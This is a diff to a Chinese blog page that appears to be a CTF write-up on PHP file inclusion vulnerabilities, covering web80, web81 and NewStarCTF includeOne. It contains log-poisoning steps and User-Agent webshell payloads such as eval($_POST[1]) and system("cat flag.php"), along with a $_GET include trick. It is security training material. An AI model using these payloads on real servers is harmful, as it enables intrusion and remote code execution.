@@ -465,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.7k
                 </div>
                 
 
@@ -497,7 +497,7 @@
             <div id="articleContent">
                 <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"><a href="#文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞" class="headerlink" title="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"></a>文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞</h2><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
 <li>php文件包含漏洞产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了意想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，最常见的就是本地文件包含漏洞</li>
-<li>开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</li>
+<li>开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。</li>
 <li>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</li>
 <li>在PHP web application中文件包含漏洞居多，jsp，asp等程序中很少，这就是语言设计的弊端</li>
 </ol>
@@ -560,12 +560,12 @@
 <li>即可查看到flag</li>
 <li>这个题的思路和逃逸很类似，将变量1逃逸出去，和命令执行中?c=include%0a$_GET[1]?&gt;&amp;1=system(‘ls’);一样</li>
 </ol>
-<h3 id="web80tong"><a href="#web80tong" class="headerlink" title="web80tong"></a>web80tong</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol>
 <li>nginx日志文件路径：?file=/var/log/nginx/access.log</li>
 <li>apache2日志文件路径:?file=/var/log/apache2/access.log</li>
 <li>直接访问会显示User-Agent的信息<br><img src="https://img-blog.csdnimg.cn/20210227204642790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDg2MjE4,size_16,color_FFFFFF,t_70"></li>
 <li>写入php文件，进行getshell<br>User-Agent:<?php system("cat flag.php");?></li>
-<li>注意：访问日志文件只会显示前几次的访问情况，要查看当前访问情况需要再一次访问</li>
+<li>注意：访问日志文件只会显示前几次的访问情况，要查看当前访问情况需要再一次访问（访问的这一次还没有写入日志中，日志中只有此次访问之前的日志信息）</li>
 </ol>
 <h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723145912.png"></li>
@@ -575,6 +575,11 @@
 <li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li>
 <li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;
 1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><ol>
+<li>  和上一个题一样，先把User-Agent写进根目录，User-Agent中的内容是php攻击payload</li>
+<li>  拼接get传参的file变量，file=/var/log/nginx/access.log</li>
+<li>  同时post传入攻击payload，和第一步配合</li>
 </ol>
 <h2 id="NewStarCTF-web2-includeOne"><a href="#NewStarCTF-web2-includeOne" class="headerlink" title="NewStarCTF web2 includeOne"></a>NewStarCTF web2 includeOne</h2><ol>
 <li>```php  <?php
@@ -1163,7 +1168,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">142.1k</span>&nbsp;字
+                class="white-color">143.8k</span>&nbsp;字
             
             
             
